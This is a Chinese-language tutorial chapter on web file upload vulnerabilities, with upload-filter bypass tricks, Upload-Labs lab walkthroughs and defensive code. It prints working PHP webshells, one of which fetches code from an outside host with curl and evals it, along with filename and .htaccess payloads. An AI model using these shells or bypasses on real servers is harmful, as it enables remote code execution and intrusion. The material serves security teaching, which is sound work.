# Chapter 6: 文件上传漏洞

## 6.1 文件上传漏洞简介

文件上传漏洞是指 Web 应用对用户上传的文件没有进行严格的验证和过滤，导致攻击者上传恶意文件（如 WebShell）并执行。

## 6.2 文件上传原理

1. Web 应用提供文件上传功能
2. 服务器对上传文件校验不严格
3. 攻击者上传恶意文件（.php, .asp, .jsp 等）
4. 访问上传的恶意文件，代码在服务器端执行

## 6.3 常见上传绕过技术

### 6.3.1 前端绕过

```javascript
// 禁用 JavaScript 上传验证
```

### 6.3.2 MIME 类型绕过

```bash
# 正常上传 PNG
Content-Type: image/png

# 绕过为 PHP
Content-Type: image/png
# 但文件名为 shell.php
```

### 6.3.3 文件名绕过

```php
# 空格绕过
shell.php .jpg

# 点号绕过
shell.php.jpg

# 大小写绕过
shell.PhP

# %00 截断
shell.php%00.jpg

# 解析漏洞
shell.jpg/.php
shell.php.jpg
```

### 6.3.4 .htaccess 绕过

```apache
# 上传 .htaccess 文件
AddType application/x-httpd-php .png
# 然后上传 png 文件，内容为 PHP 代码
```

### 6.3.5 文件包含绕过

```
# 先上传图片马
# 再通过文件包含漏洞执行
```

## 6.4 常见 WebShell

### 6.4.1 简单 PHP WebShell

```php
<?php @eval($_POST['cmd']); ?>
```

### 6.4.2 中国菜刀/冰鞋

```php
<?php
$password = "cmd";
@ini_set("display_errors", "0");
header("Content-Type: text/html; charset=utf-8");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://example.com/taodi.txt");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$ex = curl_exec($ch);
curl_close($ch);
eval($ex);
?>
```

## 6.5 Upload-Labs 靶场

### Pass-01 (前端绕过)

```javascript
// 禁用 JavaScript 或抓包修改
```

### Pass-02 (MIME 绕过)

```bash
Content-Type: image/jpeg
```

### Pass-03 (黑名单绕过)

```bash
# 上传 phtml, php3, php4, pht
shell.php3
```

### Pass-04 (.htaccess 绕过)

```bash
# 上传 .htaccess
AddType application/x-httpd-php .png

# 上传 shell.png
```

### Pass-05 (大小写绕过)

```bash
shell.PhP
```

## 6.6 文件上传防御

### 6.6.1 白名单验证

```php
$allowed_ext = ['jpg', 'png', 'gif'];
$file_ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($file_ext, $allowed_ext)) {
    die('不允许的上传类型');
}
```

### 6.6.2 文件重命名

```php
$new_name = md5(time() . rand()) . '.' . $file_ext;
```

### 6.6.3 文件内容检测

```php
$content = file_get_contents($_FILES['file']['tmp_name']);
if (strpos($content, '<?php') !== false) {
    die('文件包含恶意代码');
}
```

### 6.6.4 禁止上传可执行文件

- 禁止 .php, .asp, .jsp, .exe 等
- 使用独立的存储域名

### 6.6.5 防御总结

| 防御措施 | 说明 |
|----------|------|
| 白名单验证 | 只允许安全的文件类型 |
| 文件重命名 | 防止文件名攻击 |
| 内容检测 | 检测恶意代码 |
| 独立存储 | 上传文件与 Web 目录分离 |
| 权限控制 | 上传目录禁止执行 |
